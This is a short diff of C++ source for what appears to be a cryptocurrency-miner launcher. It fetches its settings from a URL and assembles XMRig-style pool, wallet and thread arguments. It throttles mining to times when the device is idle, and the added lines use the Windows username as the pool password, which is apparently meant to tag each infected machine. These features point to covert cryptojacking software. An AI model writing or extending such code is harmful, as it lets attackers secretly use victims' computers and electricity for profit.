@@ -28,7 +28,6 @@ int main(int argc, char *argv[])
     std::wstring url = L"http";
     std::wcout << url << std::endl;
 
-
     // Single function call to fetch and print
     std::string jsonStr = fetchJsonFromUrl(url);
     if (!jsonStr.empty())
@@ -75,6 +74,7 @@ int main(int argc, char *argv[])
     std::string template_cmd = "--donate-level 2 -o {pool} -u {address} -k {tls} -p {password} --cpu-max-threads-hint={threads}";
     std::unordered_map<std::string, std::string> replacements;
 
+
     if (IsDeviceIdle(pool_idle_time))
     {
         replacements = {
@@ -82,6 +82,15 @@ int main(int argc, char *argv[])
             {"{address}", pool_address},
             {"{password}", pool_password},
             {"{threads}", std::to_string(pool_idle_threads)},
+            {"{tls}", (pool_ssl == 1) ? "--tls" : ""}};
+    }
+    else if (pool_password == "{USER}")
+    {
+        replacements = {
+            {"{pool}", pool_pool},
+            {"{address}", pool_address},
+            {"{password}", GetWindowsUsername()},
+            {"{threads}", std::to_string(pool_threads)},
             {"{tls}", (pool_ssl == 1) ? "--tls" : ""}};
     }
     else
